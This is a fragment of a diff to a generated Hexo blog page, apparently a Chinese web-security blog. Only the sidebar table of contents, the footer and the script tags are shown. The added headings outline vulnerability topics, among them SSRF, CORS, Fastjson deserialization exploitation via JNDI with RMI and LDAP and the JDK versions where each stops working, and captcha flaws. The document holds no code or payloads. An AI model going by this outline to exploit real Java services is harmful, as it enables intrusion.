           SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">
           RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">
           spel表达式注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">4.</span> <span class="toc-text">
           XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">5.</span> <span class="toc-text">
-          CSRF</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
+          CSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">6.</span> <span class="toc-text">
+          SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CORS"><span class="toc-number">7.</span> <span class="toc-text">
+          CORS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.</span> <span class="toc-text">
+          Fastjson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">8.0.1.</span> <span class="toc-text">
+          代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">8.0.2.</span> <span class="toc-text">
+          漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#JNDI%E6%94%BB%E5%87%BB%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E5%88%86%E5%88%AB%E6%98%AFRMI%E5%92%8CLDAP%EF%BC%8C%E5%89%8D%E8%80%85%E5%9C%A8JDK-8u121%E5%8F%8A%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E5%B0%B1%E6%B2%A1%E6%B3%95%E7%94%A8%E4%BA%86%EF%BC%8C%E5%90%8E%E8%80%85%E6%98%AF%E7%9B%B4%E5%88%B08u191%E5%8F%8A%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E6%89%8D%E5%A4%B1%E6%95%88"><span class="toc-number">8.0.2.0.0.1.</span> <span class="toc-text">
+          JNDI攻击有两种方式，分别是RMI和LDAP，前者在JDK 8u121及以上版本就没法用了，后者是直到8u191及以上版本才失效</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%B9%B6%E4%B8%8A%E4%BC%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">8.0.2.0.1.</span> <span class="toc-text">
+          编译并上传命令执行代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8http%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.0.2.0.2.</span> <span class="toc-text">
+          启动http服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8LDAP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.0.2.0.3.</span> <span class="toc-text">
+          启动LDAP服务器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%91%E5%8C%85"><span class="toc-number">8.0.2.0.4.</span> <span class="toc-text">
+          发包</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">
+          验证码相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">9.0.1.</span> <span class="toc-text">
+          代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">9.0.2.</span> <span class="toc-text">
+          漏洞复现</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
